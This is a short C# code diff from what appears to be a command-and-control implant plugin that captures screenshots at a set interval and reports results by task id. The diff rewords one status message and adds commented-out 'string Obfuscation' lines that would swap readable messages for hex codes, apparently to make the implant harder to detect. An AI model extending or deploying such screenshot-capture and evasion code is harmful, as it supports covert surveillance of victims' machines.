@@ -33,6 +33,7 @@ namespace Plugins
                 screenshotTimer.Stop();
                 screenshotTimer.Dispose();
                 TaskResponseHandler.Write("Long running task detected, canceling old task ", args["task-id"], true, "error");
+                //process_response = new Dictionary<string, string> { { "message", "0x46" + intervalInSeconds  } }, //string Obfuscation
             }
 
             if (args.ContainsKey("interval") && int.TryParse(args["interval"], out intervalInSeconds))
@@ -40,6 +41,7 @@ namespace Plugins
                 if (intervalInSeconds < 0)
                 {
                     TaskResponseHandler.Write("Invalid interval value. It must be a non-negative integer.", args["task-id"], true, "error");
+                    //process_response = new Dictionary<string, string> { { "message", "0x47" + intervalInSeconds  } }, //string Obfuscation
                     return;
                 }
 
@@ -58,7 +60,8 @@ namespace Plugins
                 TaskResponseHandler.AddResponse(new ResponseResult
                 {
                     completed = true,
-                    user_output = $"Capturing screenshots every {intervalInSeconds} seconds.",
+                    user_output = $"Capturing screenshots delay between is {intervalInSeconds}.",
+                   //process_response = new Dictionary<string, string> { { "message", "0x45" + intervalInSeconds  } }, //string Obfuscation
                     task_id = args["task-id"],
                 });
             }
